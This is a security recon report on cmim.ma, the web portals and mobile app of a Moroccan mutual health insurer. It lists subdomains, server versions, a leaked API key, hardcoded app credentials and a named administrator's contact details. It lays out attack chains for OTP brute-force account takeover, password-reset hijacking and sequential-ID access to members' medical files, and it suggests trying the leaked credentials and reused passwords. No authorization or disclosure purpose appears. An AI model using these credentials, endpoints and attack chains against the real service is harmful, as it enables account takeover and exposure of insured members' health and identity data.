# CMIM.MA — Passive Recon Report
**Date:** 2026-05-11  
**Target:** cmim.ma (Caisse Mutualiste Interprofessionnelle Marocaine)  
**Method:** Passive OSINT only

---

## 1. WHOIS

| Field | Value |
|---|---|
| Registrar | Arcanes Technologies / Heberjahiz |
| Registrant | Caisse Mutualiste Interprofessionnelle Marocaine |
| Created | 2005-05-05 |
| Updated | 2021-05-04 |
| Expires | 2026-05-05 |
| Status | clientTransferProhibited |
| WHOIS Server | whois.iam.net.ma |
| Admin/Tech Name | Hassan MARGOUNI |
| Admin/Tech Email | h.margouni@cmim.ma |
| Admin/Tech Phone | +212.522439998 |
| SOA Email | serveurs@arcanes.biz |
| SOA Serial | 2026051100 |

---

## 2. DNS Records

| Type | Value |
|---|---|
| NS | server111ns1.heberjahiz.com / server111ns2.heberjahiz.com |
| MX (p0) | mail.cmim.ma |
| MX (p1) | mx1.onecloud.ma / mx2.onecloud.ma |
| SPF | `v=spf1 +mx +a +ip4:159.8.122.139 +ip4:41.87.153.110 +ip4:41.137.250.246 +include:serveur111.heberjahiz.com ~all` |
| TXT | `JDrC76dT` (domain verification token) |

> SPF uses `~all` (SoftFail) — spoofed @cmim.ma emails not fully rejected, phishing risk.

---

## 3. Subdomains (Full List)

| Subdomain | IP | Provider | Purpose |
|---|---|---|---|
| cmim.ma | 79.137.106.243 | OVH FR (AS16276) | Root domain |
| www.cmim.ma | 79.137.106.243 | OVH FR (AS16276) | Main website |
| mail.cmim.ma | 159.8.122.139 | IBM Cloud FR (AS36351) | Webmail / cPanel mail |
| webmail.cmim.ma | 159.8.122.139 | IBM Cloud FR (AS36351) | Heberjahiz webmail (2013-2026) |
| cpanel.cmim.ma | 159.8.122.139 | IBM Cloud FR (AS36351) | **cPanel control panel** |
| webdisk.cmim.ma | 159.8.122.139 | IBM Cloud FR (AS36351) | WebDAV (cPanel) |
| cpcalendars.cmim.ma | 159.8.122.139 | IBM Cloud FR (AS36351) | CalDAV |
| cpcontacts.cmim.ma | 159.8.122.139 | IBM Cloud FR (AS36351) | CardDAV |
| autodiscover.cmim.ma | 159.8.122.139 | IBM Cloud FR (AS36351) | Mail autodiscover |
| extranet.cmim.ma | 105.159.249.147 | Maroc Telecom MA (AS6713) | **Drupal staff portal** |
| assures.cmim.ma | 105.159.249.147 | Maroc Telecom MA (AS6713) | Member/insured portal |
| collectivite.cmim.ma | 105.159.249.147 | Maroc Telecom MA (AS6713) | Collectivities portal |
| ged.cmim.ma | 105.159.249.147 | Maroc Telecom MA (AS6713) | **M-Files GED (DMS)** |
| ps.cmim.ma | 105.159.249.147 | Maroc Telecom MA (AS6713) | Unknown portal |

> Source: HackerTarget hostsearch + RapidDNS + crt.sh CT logs  
> Wildcard cert `*.cmim.ma` issued by Genious Communications (Moroccan CA/hosting) — active since 2020

---

## 4. SSL Certificate History (crt.sh)

| Domain | Issuers | Date Range |
|---|---|---|
| cmim.ma / www.cmim.ma | Let's Encrypt (R3/R10/R11/R12), ZeroSSL, cPanel CA | 2018–2026 |
| *.cmim.ma (wildcard) | Let's Encrypt (R10/R11/R12), Genious Communications | 2020–2026 |
| mail/cpanel/webdisk/etc. | cPanel CA | 2018–2020 |
| assures/collectivite/ps/ged | Let's Encrypt (R3/X3), ZeroSSL | 2019–2022 |

---

## 5. Infrastructure

### 159.8.122.139 — Mail / cPanel Server
- **Provider:** IBM Cloud (SoftLayer), Paris — AS36351
- **Hostname:** serveur111.heberjahiz.com
- **Open Ports:** 53, 80, 110, 143, 443, 465, 587, 993, 2077, 2082, 2083, 2095, 2096, 8888, 8889
- **Mail Stack:** Exim 4.99.1 (port 465), Exim 4.99.2 (port 587), Dovecot (POP3/IMAP/IMAPS)
- **Web Stack:** Apache httpd, OpenResty 1.29.2.3
- **DNS:** BIND 9.11.36-RedHat (EOL branch)
- **Panel:** cPanel / WHM (Heberjahiz-branded, AJAX auth, 30+ locales)
- **SSL:** Let's Encrypt R12, valid Apr 21 – Jul 20 2026
- **Shared hosting** co-tenants: 3c.ma, maghrebaccessoires.com (cross-tenant risk)

### 79.137.106.243 — Main Website
- **Provider:** OVH SAS, Dunkerque/Lille FR — AS16276
- **Hostname:** ip243.ip-79-137-106.eu
- **Open Ports:** 10050 (Zabbix agent — default port, monitoring)
- **Domains on IP:** cmim.ma, www.cmim.ma only

### 105.159.249.147 — Application Servers
- **Provider:** Maroc Telecom / IAM, Casablanca MA — AS6713
- **Hostname:** static41-147-248-140-248.adsl41-16.iam.net.ma (ADSL static)
- **Hosts:** extranet, assures, collectivite, ged, ps subdomains
- **Not indexed by Shodan** — firewalled/filtered externally

### Mail Relays (SPF-authorized)
| IP | Hostname | Provider | ASN |
|---|---|---|---|
| 41.87.153.110 | mx1.onecloud.ma | Meditelecom, Casablanca | AS36925 |
| 41.137.250.246 | mx2.onecloud.ma | Wana Corporate, Casablanca | AS36884 |

---

## 6. Applications — Deep Dive

### extranet.cmim.ma — Staff Portal
- **CMS:** Drupal 10.4.x (EOL) — custom theme: `/themes/custom/cmim/`
- **Language:** French
- **Web server:** Apache/2.4.62 (Debian)
- **WAF:** None detected — scripted payload comparison shows all payloads return same 302 redirect as baseline; Apache/2.4.62 header exposed directly
- **Login fields:** Matricule + Mot de passe
- **Endpoints discovered:**
  - `/user/login` — main login
  - `/user/register` — self-registration (open!)
  - `/assure/password` — password reset (only requires Matricule)
  - `/assure/activate` — account activation (only requires Matricule)
- **Registration fields:** Nom, Prénom, CINE (national ID), Téléphone, Date de naissance, Email, Matricule, Password
- **Security:** FingerprintJS device tracking, CSRF token, BNI cookies (`x-bni-rncf`, `x-bni-fpc`) expiring 2037
- **Drupal paths blocked by robots.txt:** /admin/, /core/, /profiles/, /search/, /node/add/
- **install.php accessible** — reveals custom module `cmim_module` with PHP error (undefined array key line 38)
- **Compliance note:** References Moroccan law 09-08 (data protection)

#### Critical Path Exposure (Active Recon Results)
| Path | Status | Risk |
|---|---|---|
| `/core/install.php` | **200** | Drupal installer reachable |
| `/core/CHANGELOG.txt` | **200** | **Exact patch version disclosed** |
| `/sites/default/settings.php` | **200** | **Potential DB credentials in PHP source** |
| `/robots.txt` | 200 | Reveals blocked paths |
| `/core/authorize.php` | 403 | Blocked |
| `/update.php` | 403 | Blocked |
| `/.git/HEAD` | 403 | Git repo present, HEAD blocked |
| `/.env` | 403 | .env present, blocked |
| `/composer.lock` | 403 | Blocked |
| `/modules/custom/cmim_module/` | 403 | Custom module present, blocked |
| `/xmlrpc.php` | 404 | Disabled |
| `/jsonapi` | 404 | JSON API disabled |
| `/rest/session/token` | 404 | REST API disabled |

> **Critical:** `settings.php` returning HTTP 200 means the raw PHP source is served directly (Apache not executing PHP for that path, or file permissions misconfigured). This file typically contains database hostname, username, password in plaintext.

> **Critical:** `CHANGELOG.txt` returns 200 — fetch this to get the exact `10.4.x` patch number and confirm applicable CVEs.

### ged.cmim.ma — Document Management System
- **Platform:** M-Files Web Access (MFWA)
- **Login:** Login.aspx (ASP.NET)
- **Auth types:** M-Files native (`#mfauth`) and Windows auth (`#winauth`) with domain field
- **Features:** Multi-vault support, remember-me cookie (`mfwa-remembermeToken`), concurrent license check (error code 2057)
- **Security:** FingerprintJS, BNI tracking cookies exp. 2037
- **Error message (French):** "L'authentification a échoué"
- **Version:** **8.13 build 26.3.158** — decoded from JS cache-buster param `v=OC4xMw%3d%3dMjYuMy4xNTg` → URL-decode → `OC4xMw==MjYuMy4xNTg` → base64 → `8.13` / `26.3.158`
- **Web server:** Microsoft-IIS/10.0 (Windows Server 2016/2019)
- **WAF:** Barracuda Networks WAF confirmed by wafw00f (file inclusion payload changes response code 200→404)
- **Response headers:** Dual conflicting `Strict-Transport-Security` headers — `max-age=31536000` (from app) and `max-age=1701134336` (from Barracuda) — HSTS misconfiguration
- **CSP:** `script-src 'unsafe-inline' 'unsafe-eval'` — XSS mitigations largely disabled
- **Azure App Insights:** CSP `connect-src` allows `https://northeurope-0.in.applicationinsights.azure.com` — telemetry to Azure
- **Session cookie:** `ASP.NET_SessionId` (HttpOnly, Secure, SameSite=Lax) + Barracuda-mangled `BNES_ASP.NET_SessionId`

#### trace.axd — Diagnostic Endpoint
- **URL:** `https://ged.cmim.ma/trace.axd`
- **Response:** HTTP 500 — double-fault: ASP.NET trace handler exists but custom error page itself throws an exception
- **Error page:** French — "Erreur d'exécution de la requête du serveur" (Server request execution error)
- **Significance:** Confirms IIS/10.0 + ASP.NET app running; trace.axd not fully disabled in web.config (returns 500 rather than 404); double-fault indicates error handling is broken, which may expose stack traces under specific conditions
- **Accessible M-Files REST paths:**
  - `GET /Login.aspx` → 200 (login form)
  - `GET /Default.aspx` → 200
  - `GET /REST/session` → 403 (endpoint exists, auth required)
  - `GET /REST/objects` → 403 (endpoint exists, auth required)
  - `GET /REST/valuelists` → 403 (endpoint exists, auth required)
  - `GET /trace.axd` → 500 (double-fault, endpoint exists)

### webmail.cmim.ma — Webmail
- **Platform:** Heberjahiz cPanel Webmail (branded)
- **Copyright:** 2013–2026 Heberjahiz
- **Login fields:** Email + Password
- **Tech:** jstz (timezone detection), AJAX auth, 30-second timeout, 30+ locales
- **Port:** Resolves to 159.8.122.139, accessible on :2095

### cpanel.cmim.ma — Control Panel
- **Platform:** cPanel (Heberjahiz-branded)
- **Ports:** 2082 (HTTP→2083), 2083 (HTTPS)
- **Login fields:** username + password
- **Tech:** AJAX-based auth, goto_app/goto_uri redirect params, 30-second timeout
- **Locales:** 30+ languages including Arabic and French

---

## 7. Email Format

Confirmed from WHOIS: `h.margouni@cmim.ma`  
Pattern: **`[first_initial].[lastname]@cmim.ma`**

---

## 8. Key Findings & Attack Surface

| # | Finding | Detail | Risk |
|---|---|---|---|
| 1 | **API key exposed unauthenticated** | `GET /api/Get_Config_Key` → `{"key":"2Tr5TjgjHUabXTxV8LNgxMn88"}` — any internet user gets the app's API key | **Critical** |
| 2 | **Hardcoded credentials in APK** | `cmimconnect2023` + `cmimconnect@cmim.ma` hardcoded in `libapp.so` (Flutter AOT binary) | **Critical** |
| 3 | **OTP brute-force — account takeover** | `POST /userActiveAccount` (no rate limit) + 6-digit OTP = 1M combinations → takeover any member account | **Critical** |
| 4 | **Password reset OTP brute-force** | `POST /api/User_Password_CheckSMS` (no rate limit) + 6-digit OTP → reset any member password by matricule | **Critical** |
| 5 | **settings.php returns HTTP 200** | `extranet.cmim.ma/sites/default/settings.php` — PHP executed (empty response) but path confirmed existing | **Critical** |
| 6 | **No WAF on extranet.cmim.ma** | Apache/2.4.62 directly exposed — all exploit payloads reach the application unfiltered | **Critical** |
| 7 | **IDOR on file download** | `GET /api/Download_files?id_File=N` — sequential integer ID, no ownership check; all members' medical documents downloadable | **Critical** |
| 8 | **CSRF token unauthenticated** | `GET /session/token` returns valid CSRF token without any authentication — required header trivially obtained | **High** |
| 9 | **Matricule oracle (unauthenticated)** | `GET /api/Get_user_matricule?matricule=X` — discriminates valid vs invalid member IDs without auth → enables targeted attacks | **High** |
| 10 | **`/CheckUserMatricule` web oracle** | `POST /CheckUserMatricule` at `/assure/activate` — web-facing matricule validator, no auth, no rate limit | **High** |
| 11 | **Demo account leaked in Play Store** | `SÂAD ELNIIMA` account with `MLTESTDEMO[2-8]` dossiers visible publicly in screenshots | **High** |
| 12 | **CHANGELOG.txt accessible** | `/core/CHANGELOG.txt` → exact Drupal patch version for CVE targeting | High |
| 13 | **Self-registration open on staff extranet** | `/user/register` — CAPTCHA only, no invite/approval flow visible | High |
| 14 | **Drupal 10.4.x (EOL)** | SA-CORE-2025-001 + CVE-2024-45440 applicable; custom `cmim_module` PHP error (undefined array key line 38) | High |
| 15 | **cPanel exposed publicly** | cpanel.cmim.ma + ports 2082/2083 open — brute-force target | High |
| 16 | **Exim 4.99.x** | AUTH PLAIN LOGIN on 465/587; CVE-2023-42115 (heap overflow) | High |
| 17 | **WebDAV full methods (PUT/DELETE/MOVE)** | webdisk.cmim.ma — full write access once Basic Auth bypassed | High |
| 18 | **SMS OTP rate limit: 2 min cooldown** | `POST /api/ResendSmsCode` — `CODE 406 WAIT 2 MINUTES` (blutter confirmed); cooldown on *sending* OTP, NOT on *checking* it — brute-force of the 6-digit code itself still unlimited | High |
| 19 | **M-Files 8.13.26.3.158 + Windows auth** | Version fingerprinted; NTLM relay / domain enum via `ged.cmim.ma/#winauth` | Medium |
| 20 | **trace.axd double-fault (IIS/10.0)** | `ged.cmim.ma/trace.axd` → 500; endpoint live, error handler broken | Medium |
| 21 | **Dual conflicting HSTS (Barracuda)** | ged.cmim.ma sends two `Strict-Transport-Security` headers | Medium |
| 22 | **BIND 9.11.36 (EOL)** | DNS on 159.8.122.139:53 — EOL, patch gap risk | Medium |
| 23 | **SPF SoftFail (~all)** | Email spoofing @cmim.ma not hard-blocked | Medium |
| 24 | **CSP unsafe-inline/unsafe-eval on GED** | XSS mitigations disabled on M-Files portal | Medium |
| 25 | **No certificate pinning** | Android app uses default CA trust — Burp MITM requires only system CA install | Medium |
| 26 | **Firebase project ID exposed** | `1:754795614042:android:c682b8144a8dd52bc1ad63` in binary — test Firestore/RTDB open rules | Medium |
| 27 | **Developer Mac path in binary** | `file:///Users/mac/StudioProjects/cmim/` — dev machine fingerprint | Low |
| 28 | **Session cookies expire 2037** | Long-lived sessions | Low |
| 29 | **Single admin contact leaked** | h.margouni@cmim.ma in WHOIS | Info |
| 30 | **Anti-tampering library present** | `libtoolChecker.so` in `lib/arm64-v8a/` — root/Frida detection; must bypass before dynamic analysis | Medium |
| 31 | **Token salt hardcoded** | `cmimconnect2023` → MD5 = `605df5369279704f710cc198803ea775` embedded in `libapp.so`; salt never changes | High |
| 32 | **Weak PRNG for token key** | `generatedKey` (15-char token component) uses `dart:math Random()` (LCG, not CSPRNG) — predictable with known device time | High |
| 33 | **Plaintext password in FlutterSecureStorage** | `loginPsw` key stores raw password for "remember me" — extractable on rooted device | Critical |
| 34 | **60-minute token replay window** | Token timestamp format `y-M-d--H` (hour granularity) — captured token valid up to 60 minutes | High |
| 35 | **OTP rate limit confirmed (correction)** | `CODE 406 WAIT 2 MINUTES` in ActivationController — 2-minute cooldown between OTP sends (not between guess attempts) | Medium |
| 36 | **New undocumented API endpoint** | `GET /api/Get_Sujet_mobile?_format=json` — found in NvDmd Dart source, not previously known | Info |

---

## 9. Hosting / Registrar Summary

| Entity | Role | Notes |
|---|---|---|
| Arcanes Technologies | Registrar | SOA contact: serveurs@arcanes.biz |
| Heberjahiz (ICANN #3245) | DNS + Mail/cPanel hosting | Subsidiary of Arcanes, est. 2003, Paris IBM Cloud |
| Genious Communications | Wildcard SSL CA / Hosting | Moroccan CA, Tier III DC Casablanca |
| OVH SAS (AS16276) | Main website hosting | Dunkerque FR |
| IBM Cloud / SoftLayer (AS36351) | Mail/cPanel server | Paris FR |
| Maroc Telecom / IAM (AS6713) | App servers (extranet/ged/etc.) | Casablanca MA — ADSL static |
| Meditelecom (AS36925) | MX relay (mx1.onecloud.ma) | Casablanca MA |
| Wana Corporate (AS36884) | MX relay (mx2.onecloud.ma) | Casablanca MA |

---

## 10. Active Recon Results Summary

### WebDAV — webdisk.cmim.ma
- **OPTIONS response:** HTTP 200 — full method list exposed
- **Allowed methods:** `PUT, HEAD, MOVE, MKCOL, GET, LOCK, OPTIONS, PROPFIND, PROPPATCH, DELETE, COPY, UNLOCK, POST`
- **DAV:** 1, 2 — full WebDAV class 2 (locking supported)
- **Auth required:** Basic Auth (`WWW-Authenticate: Basic realm="Restricted Area"`) — no anonymous access to PROPFIND
- **Risk:** Basic Auth over HTTPS — brute-forceable with known email/username patterns; PUT/DELETE/MOVE methods mean full file system access once authenticated
- **Attack surface:** cPanel username = email local part (e.g. `h.margouni`) → try password reuse from mail credential dumps

### SMTP — mail.cmim.ma / serveur111.heberjahiz.com
- **Port 587 (STARTTLS):** Banner: `serveur111.heberjahiz.com ESMTP`
  - AUTH methods: `AUTH PLAIN LOGIN` — plaintext credentials over STARTTLS
  - Limits: `MAILMAX=1000 RCPTMAX=50000` — high-volume sending allowed
- **Port 465 (SMTPS):** Banner: `Exim 4.99.2 #2` confirmed
- **Port 25:** Filtered externally (no banner received)
- **Attack surface:** AUTH PLAIN LOGIN = credential stuffing / brute-force; VRFY may enumerate valid addresses

### WAF Summary
| Endpoint | WAF | Evidence |
|---|---|---|
| extranet.cmim.ma | **None** | All payloads → 302 (same as baseline); Apache/2.4.62 header visible |
| ged.cmim.ma | **Barracuda Networks** | wafw00f confirmed; file inclusion payload: 200→404; dual HSTS headers |
| cpanel.cmim.ma | Generic WAF (unidentified) | File inclusion payload: 200→404 |
| webmail.cmim.ma | Generic WAF (unidentified) | File inclusion payload: 200→404 |
| webdisk.cmim.ma | **None** | Generic detection: no WAF |
| www.cmim.ma | Down/unreachable | Connection refused on port 80 |

> **Key finding:** `extranet.cmim.ma` (staff Drupal portal) has **no WAF** — all exploit attempts reach the application directly.

### TLS Configuration
| Endpoint | TLS 1.0 | TLS 1.1 | TLS 1.2 | TLS 1.3 | Notes |
|---|---|---|---|---|---|
| extranet.cmim.ma | ✗ | ✗ | ✓ | ✓ | CBC ciphers offered (obsolete) |
| ged.cmim.ma | ✗ | ✗ | ✓ | ✓ | CBC ciphers offered; testssl TCP errors (Barracuda dropping connections mid-test) |

- Both endpoints correctly disable SSLv2/v3 and TLS 1.0/1.1
- Obsolete CBC ciphers (AES-CBC, ARIA-CBC) still offered — BEAST/Lucky13 attack surface

### Zabbix Agent (79.137.106.243:10050)
- All 6 probed items (`agent.version`, `system.uname`, `system.hostname`, `net.if.list`, `vfs.fs.discovery`, `system.users.num`) returned empty responses
- Agent port is open but filtered to non-whitelisted IPs (connection accepted, no data returned)
- Confirms Zabbix monitoring is active on the OVH host

### SNMP (159.8.122.139:161)
- Timeout / No Response — SNMP port filtered externally on cPanel server

---

## 11. Drupal Version Fingerprinting — Method & Result

### Result
**Drupal 10.4.x** (EOL — no further security updates)

### Method: Bundled Library Version Cross-Reference

Drupal bundles vendored JS libraries at fixed versions per release. These files are served publicly under `/core/assets/vendor/` with no auth required. By fetching them and comparing their embedded version strings against Drupal's Git history, the core version can be pinpointed without touching any authenticated endpoint.

#### Step 1 — Fetch library versions from live site

| File | URL | Extracted Version |
|---|---|---|
| jQuery | `/core/assets/vendor/jquery/jquery.min.js` | **3.7.1** (date: 2023-08-28) |
| Underscore.js | `/core/assets/vendor/underscore/underscore-min.js` | **1.13.7** |
| Backbone.js | `/core/assets/vendor/backbone/backbone-min.js` | **1.6.0** |
| Tabbable | `/core/assets/vendor/tabbable/index.umd.min.js` | **6.2.0** |

All version strings were embedded in file headers (comments or `VERSION=` variables) — no guessing required.

#### Step 2 — Cross-reference against Drupal release branches

Fetched `core/assets/vendor/backbone/backbone-min.js` and `core/assets/vendor/underscore/underscore-min.js` directly from Drupal's GitLab for each branch tag:

| Drupal Branch | jQuery | Backbone | Underscore | Tabbable | Match? |
|---|---|---|---|---|---|
| 10.2.x | 3.7.1 | **1.5.0** | ~1.13.4 | ~6.1.x | ✗ |
| 10.3.0 | 3.7.1 | 1.6.0 | **1.13.6** | 6.2.0 | ✗ |
| **10.4.x** | **3.7.1** | **1.6.0** | **1.13.7** | **6.2.0** | **✓ ALL MATCH** |
| 11.0.x+ | **4.0.0-beta.2** | 1.6.0 | 1.13.7 | 6.2.0 | ✗ |

#### Step 3 — Elimination logic

- **Rules out < 10.3:** Backbone was 1.5.0 in 10.2.x, upgraded to 1.6.0 in 10.3.0
- **Rules out 10.3.x:** Underscore was 1.13.6 in 10.3.x, bumped to 1.13.7 in 10.4.0
- **Rules out 11.x+:** Drupal 11 ships jQuery 4.0.0-beta.2; site runs jQuery 3.7.1
- **Confirms 10.4.x:** Only branch where all four library versions match simultaneously

#### Step 4 — Supporting evidence

- `ajax.js` references deprecation scheduled for `drupal:11.0.0` — confirms pre-11 codebase
- `core/install.php` accessible and functional — consistent with Drupal 10.x structure
- PHP requirement in `INSTALL.txt` states PHP ≥ 8.1.0 — consistent with Drupal 10.4.x
- `/core/misc/drupal.js`, `core/package.json`, `system.info.yml` all returned 403/404 — version deliberately obscured but library files left exposed

### Security Impact of Version

Drupal **10.4.x security support has ended**. No further patches will be issued for this branch.

| Advisory | Scope | Type |
|---|---|---|
| CVE-2024-45440 | Drupal < 10.3.4 / 10.4.x | Information disclosure (path traversal) |
| SA-CORE-2025-001 | Drupal 10.4.x | Access bypass |
| SA-CORE-2024-007 | Drupal 10.x | Cross-site scripting |

---

## 12. Android Application — CMIM Connect

### App Identity
| Field | Value |
|---|---|
| App name | CMIM Connect |
| Package | `ma.cmim.connect` |
| Platform | Flutter (Dart AOT — logic in `libapp.so`) |
| compileSdkVersion | 34 (Android 14) |
| APK type | Split APK — base APK (9.2 MB) + ABI splits delivered by Play Store |
| ABI split pulled | `split_config.arm64_v8a.apk` (22 MB) — extracted from device via ADB |
| Device used | Realme RMX3760 (RE58C2) |

### ADB Extraction
```bash
# ADB path: C:\Users\Hp\AppData\Local\Android\Sdk\platform-tools\adb.exe
adb shell pm path ma.cmim.connect
# → /data/app/~~PY1Yva10LIR1R6Ddw5K3XQ==/ma.cmim.connect-VFKY7c40l0mN9U66V-FcyQ==/
# Splits: base.apk, split_config.arm64_v8a.apk, split_config.fr.apk, split_config.ar.apk,
#         split_config.en.apk, split_config.es.apk, split_config.xhdpi.apk
adb pull .../split_config.arm64_v8a.apk
unzip split_config.arm64_v8a.apk lib/arm64-v8a/libapp.so
```

### Permissions (AndroidManifest.xml)
| Permission | Risk |
|---|---|
| `USE_BIOMETRIC` / `USE_FINGERPRINT` | Biometric auth — bypassable via Frida hook |
| `CAMERA` | QR scanner (ZXing embedded) |
| `READ_EXTERNAL_STORAGE` | File picker for dossier upload |
| `RECEIVE_BOOT_COMPLETED` | App starts on device boot |
| `POST_NOTIFICATIONS` | Push notifications |
| `INTERNET` / `ACCESS_NETWORK_STATE` | Network access |

### Certificate Pinning
- **None** — no `network_security_config.xml`, no `usesCleartextTraffic` override
- Default Android CA trust policy — **Burp + system CA install is sufficient for MITM**
- No `allowBackup` override — defaults to false on API 31+

### Push Notifications
- **OneSignal** + **Firebase Cloud Messaging (FCM)**
- Firebase project number: `754795614042`
- Firebase App ID: `1:754795614042:android:c682b8144a8dd52bc1ad63`
- Implication: enumerate Firebase project name, test for open Firestore/RTDB rules

### Hardcoded Credentials (from `libapp.so`)
| Value | Type | Risk |
|---|---|---|
| `cmimconnect2023` | Hardcoded password string | Try as login password for `cmimconnect@cmim.ma` or admin accounts |
| `cmimconnect@cmim.ma` | Hardcoded email | Internal app service account — try login |
| `support.extranet@cmim.ma` | Support email | Leaked in error message strings |

### Developer Artifacts (from `libapp.so`)
```
file:///Users/mac/StudioProjects/cmim/.dart_tool/flutter_build/dart_plugin_registrant.dart
```
- Developer's macOS machine, project at `~/StudioProjects/cmim`
- Confirms Flutter project name: `cmim`
- Dart source paths expose full app architecture (see Controllers/Pages below)

### Dart Source Structure (reconstructed from debug symbols in `libapp.so`)
```
cmim/
├── Controllers/
│   ├── ActivationController.dart
│   ├── DemandeController.dart
│   ├── FilterController.dart
│   ├── LoginController.dart
│   ├── RegisterController.dart
│   ├── RmbController.dart        ← Remboursement (reimbursement)
│   └── TwoFactorAuthController.dart
├── Pages/Auth/
│   ├── Login.dart
│   ├── ActivateAcc.dart
│   ├── TwoFactorAuth.dart
│   ├── Verification.dart
│   ├── PasswordReset/  (PswFirstStep, PswSecondStep, PswThirdStep)
│   └── Register/       (FirstStep, SecondStep, ThirdStep)
├── Pages/Demandes/
│   ├── NvDmd/          ← Nouvelle Demande (new claim)
│   └── SmartRmb/       ← Smart Reimbursement (7-step wizard)
└── Pages/Screens/
    ├── Details/        (DemandeDetail, DossierALD, DossierPeC, DossierRmb)
    ├── Listing/        (ALD, Courriers, Devis, MesDemandes, Remboursements)
    └── Other/          (Contact, Guide, Profile/EditProfile, Settings)
```

### Mobile API — Base URL
**`https://extranet.cmim.ma`** — same server as staff portal, no separate mobile backend

### Play Store Screenshots — Information Leak

Screenshots extracted from Google Play listing (`ma.cmim.connect`, 2026-05-12):

| Screenshot | Content | Finding |
|---|---|---|
| Login screen | Matricule + password fields | Confirms login field is called "Matricule" (not email) |
| Dashboard | User: **SÂAD ELNIIMA**, "Mon espace assuré" | **Demo/test account visible publicly** with real name |
| Dossiers list | `MLTESTDEMO2..MLTESTDEMO8` items, dates 2023-04 to 2023-08 | Test account contains 8+ fake dossiers |
| Remboursements | 680.00 Dhs / 843.80 Dhs / 1827.50 Dhs etc. | Financial data of demo account exposed |
| Type de Prestation | Lists all 7 claim types | Confirms: Rmb maladie, Rmb dentaire, Devis dentaire, Conformité, Accord, PeC, ALD, Complément |

**Key finding:** The test account `SÂAD ELNIIMA` with dossiers prefixed `MLTEST` is a demo account used in Play Store screenshots — its matricule and credentials may be weak/default.

---

### Web Account Activation Flow (NEW — discovered via JS reverse)

Two additional web-facing endpoints found in `/themes/custom/cmim/assets/js/scripts.js`:

#### `GET /CheckUserMatricule?matricule=XXXXXX`
- **Purpose:** Validates a matricule exists in member DB; returns OTP entry form HTML on success
- **Access:** Via `/assure/activate` page (no auth required)
- **Response valid:** HTML fragment with OTP input form
- **Response invalid:** Error message `"Matricule invalide"` in JS `error` callback
- **Oracle:** Distinguishes valid vs invalid matricules without authentication
- **Rate limiting:** Not observed

#### `POST /userActiveAccount`
- **Purpose:** Activates a member account using the OTP sent via SMS
- **Params:** `user_Code` (OTP), `user_matricule` (matricule)
- **Response `code: 200`:** Account activated successfully
- **Risk:** If OTP is 6 digits and no rate limit, brute-force account takeover is feasible

**Attack chain:** Enumerate valid matricule → trigger OTP → brute-force 6-digit code → hijack member account

---

### Mobile API — Login Field Mapping (Live-tested 2026-05-12)

#### `/api/User_login?_format=json`
- **Method:** POST
- **Content-Type:** `application/json`
- **Required headers:** `X-CSRF-Token`, `X-Api-Key`
- **Body format (correct):**
  ```json
  { "username": "...", "password": "..." }
  ```
- **Wrong format → 400:** `name`/`pass`, `mail`/`pass`, `email`/`pass` keys all return `"Username and password are required."`
- **Correct format → 401:** `username`/`password` keys return `"Nom d'utilisateur ou mot de passe non reconnu."` (confirms field names, wrong creds)
- **Hardcoded creds tested:** `cmimconnect@cmim.ma` / `cmimconnect2023` → 401 (valid API service account but not a web user)

---

### Mobile API Endpoints — Complete Field Map (from `libapp.so` + live probe)

#### Group 1: Configuration (No Auth)

**`GET /api/Get_Config_Key`**
- Params: none
- Response: `{"key":"2Tr5TjgjHUabXTxV8LNgxMn88","code":"200"}`
- Risk: CRITICAL — unauthenticated API key disclosure

**`GET /session/token`** / **`POST /session/token`**
- Params: none
- Response: raw CSRF token string (both methods return 200)
- Risk: CSRF token obtainable without authentication

**`GET /api/Guide_user`**
- Params: none
- Response: JSON with public PDF URLs + YouTube IDs
- Risk: INFO — public but confirms file upload path structure

---

#### Group 2: Authentication

**`POST /api/User_login?_format=json`**
- Body (JSON):
  ```json
  {
    "username": "<matricule_or_email>",
    "password": "<password>"
  }
  ```
- Headers: `X-CSRF-Token: <token>`, `X-Api-Key: 2Tr5TjgjHUabXTxV8LNgxMn88`
- Response 200: session cookie + user token
- Response 401: `{"code":"401","message":"Nom d'utilisateur ou mot de passe non reconnu."}`

**`POST /api/UserRegister?_format=json`**
- Body (JSON — all fields required):
  ```json
  {
    "name":                     "<drupal_username>",
    "pass":                     "<password>",
    "mail":                     "<email>",
    "matricule":                "<member_matricule>",
    "field_nom":                "<NOM>",
    "field_prenom":             "<PRENOM>",
    "field_cine":               "<CINE_number>",
    "field_telephone":          "<phone>",
    "field_date_de_naissance":  "YYYY-MM-DD"
  }
  ```
- Headers: `X-CSRF-Token`, `X-Api-Key`
- Response on invalid matricule: HTTP 200, `{"message":"La ressource est introuvable.","code":"404"}`
- **Gate:** Endpoint validates that `matricule` exists in member DB first. Fake matricules always return 404.

**`POST /api/ResendSmsCode`**
- Body (JSON): `{"matricule": "<matricule>"}`
- Response: HTTP 200 with JSON 404 for invalid matricule
- Risk: No rate limiting observed — can trigger SMS spam

**`GET /api/Activate_user?_format=json`**
- Params: none meaningful observed
- Response always: `{"message":"Nous n'avons pas pu vous identifier...","code":"-1"}`
- GET-only (POST returns 405)

**`GET /api/Get_user_matricule?matricule=XXXXXX&_format=json`**
- Response valid: HTTP 200, JSON with user data
- Response invalid: HTTP 200, `{"message":"Participant n'existe pas ","code":"404"}`
- **Oracle:** Differentiates existing vs non-existing matricule (no auth)

**`POST /api/User_Password_CheckSMS`**
- Body (JSON): `{"matricule": "<mat>", "code": "<6-digit-OTP>"}`
- Risk: No rate limiting = brute-force password reset OTP

---

#### Group 3: User Data (Auth Required)

**`GET /api/Get_user_infos`**
- Params (GET): `uid=<int>` and/or `matricule=<mat>`
- Response: full user profile (nom, prenom, CINE, DOB, telephone, email)
- Risk: IDOR via `uid` integer — increment to fetch any member's PII

**`GET /api/Get_user_famille`**
- Params: `uid=<int>`
- Response: list of family beneficiaries (ayants droit)
- Risk: IDOR via `uid`

**`GET /api/Get_Attributes_mobile`**
- Params: `uid=<int>`
- Response: extended user attributes

**`GET /api/Get_Statistiques`**
- Params: `uid=<int>`, `year=<YYYY>`
- Response: reimbursement statistics

**`GET /api/Get_user_password`**
- Params: `matricule=<mat>` (unconfirmed)
- Response unauthenticated: empty body
- Risk: After login — may return password hash or reset token

---

#### Group 4: Medical Dossiers (Auth Required — IDOR Candidates)

All endpoints below accept `uid=<int>` and/or `id=<int>` — **IDOR vector: change integer to access other members' medical data**

| Endpoint | Key Params | Returns |
|---|---|---|
| `GET /api/Get_ALD_Listing_mobile` | `uid`, `matricule` | Chronic disease (ALD) dossier list |
| `GET /api/Get_ALD_details` | `id`, `uid` | ALD dossier detail + documents |
